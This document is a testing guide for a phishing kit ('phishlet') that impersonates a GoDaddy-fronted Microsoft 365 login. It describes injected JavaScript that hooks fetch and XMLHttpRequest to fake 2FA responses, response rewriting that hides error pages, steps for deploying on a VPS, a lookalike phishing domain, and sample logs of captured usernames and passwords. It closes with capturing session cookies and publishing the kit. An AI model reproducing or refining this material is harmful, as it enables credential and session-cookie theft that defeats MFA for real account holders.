# O365/GoDaddy Phishlet Testing Guide

## What Was Fixed

The updated phishlet now has **4 defensive layers** to handle the `/v1/api/pass/login` 405 error:

1. **<head> Injection** – Blocks at the absolute earliest moment (before page scripts load)
   - Intercepts fetch() calls to `/v1/api/pass/login`
   - Intercepts XMLHttpRequest calls to `/v1/api/pass/login`
   - Returns fake 2FA response immediately

2. **js_inject Fetch Wrapper** – Secondary layer catching fetch-based requests
   - Detects `/v1/api/pass/login` URLs
   - Returns simulated 2FA JSON response
   - Logs to console: `[x-tymus] Fetch blocking /v1/api/pass/login`

3. **js_inject XHR Wrapper** – Catches XMLHttpRequest-based requests
   - Detects `/v1/api/pass/login` in URL
   - Fakes HTTP 200 response with 2FA structure
   - Logs to console: `[x-tymus] XHR blocking /v1/api/pass/login`

4. **Sub_Filter Fallback** – Rewrites error page responses
   - If error page ("Yikes!", "Something went wrong") is rendered
   - Rewrites response body to 2FA JSON structure

---

## Testing on VPS

### Step 1: Replace Phishlet
```bash
# Stop x-tymus
# Copy updated 0365.yaml to x-tymus/build/phishlets/
# Restart x-tymus
```

### Step 2: Open Browser Console
1. Open the phishing landing page
2. Press **F12** to open Developer Tools
3. Go to **Console** tab
4. You'll see one of these logs:
   - `[x-tymus] Early setup: _passLoginResponse initialized` ✅ Script loaded
   - `[x-tymus] Fetch blocking /v1/api/pass/login: [URL] method: [GET/POST]` ✅ fetch() blocked
   - `[x-tymus] XHR blocking /v1/api/pass/login: [URL] method: [GET/POST]` ✅ XHR blocked

### Step 3: Enter Credentials
1. Email: `test@domain.com` (or any email)
2. Password: `TestPassword123!`
3. Watch the console for the blocking log

### Step 4: Check Server Logs
```bash
# Look for these patterns in x-tymus output:

# ✅ SUCCESS (request blocked by JS, never hits proxy):
[+++] [js-cred] Username: [test@domain.com]
[+++] [js-cred] Password: [TestPassword123!]
# (NO /v1/api/pass/login request in logs = JS blocking worked!)

# ⚠️ FALLBACK (request hit proxy but was rewritten):
[dbg] [cred] host=sso.godaddy.com path=/v1/api/pass/login
[dbg] [sub_filter] rewrote "error|Yikes|405" → "2FA JSON" 
# (Page now shows 2FA code entry screen)
```

### Step 5: Verify 2FA Flow
- After submitting password, page should:
  1. Stop showing "Yikes! Something went wrong"
  2. Show a code entry prompt ("Enter verification code")
  3. Display email (e.g., `test@...example.com`)
  4. Allow code submission
  5. Flow continues to Microsoft federation

---

## Expected Console Logs

### Best Case (JavaScript blocking works):
```
[x-tymus] Early setup: _passLoginResponse initialized
[x-tymus] Blocked service worker registration attempt
[x-tymus] Updated 2FA response email from URL: test@domain.com
[x-tymus] Fetch blocking /v1/api/pass/login: https://ssso.nidlec-motor.com/v1/api/pass/login method: POST
```

### Fallback Case (Sub_filter rewrites response):
```
[x-tymus] Early setup: _passLoginResponse initialized
[+++] [js-cred] Username: [test@domain.com]
[+++] [js-cred] Password: [TestPassword123!]
[dbg] [cred] host=sso.godaddy.com path=/v1/api/pass/login method=POST
[dbg] [sub_filter] rewrote (Yikes|Something went wrong|...) → {"success":true,"requiresMFA":true,...}
```

---

## Troubleshooting

### If You Still See "Yikes" Error:
1. **Check browser console** for `[x-tymus]` logs
2. **If NO logs appear**: JavaScript isn't loading
   - Clear cache: Ctrl+Shift+Del
   - Hard refresh: Ctrl+Shift+R
   - Check Network tab for 0365.yaml load errors

3. **If "Fetch blocking" log appears but error persists**:
   - GoDaddy's JS might be using different method
   - Next layer (sub_filter) should catch the error page
   - If error persists, request still hit proxy = 2FA response being returned

### If Page Doesn't Progress After Code Entry:
- The 2FA response structure might need adjustment
- Check what GoDaddy expects in the response
- May need to provide actual 2FA code handling endpoint

---

## If Tests Pass

Once you see the page transition from "password" → "2FA code entry" screen:

1. **Credentials are captured** ✅
2. **2FA flow is intercepted** ✅
3. **Session is on proxy (not real GoDaddy)** ✅

At this point, you can:
- Submit any 2FA code (we're intercepting the verification)
- Capture the complete session cookies
- Continue to Microsoft federation

Upload the final phishlet to GitHub once confirmed working.
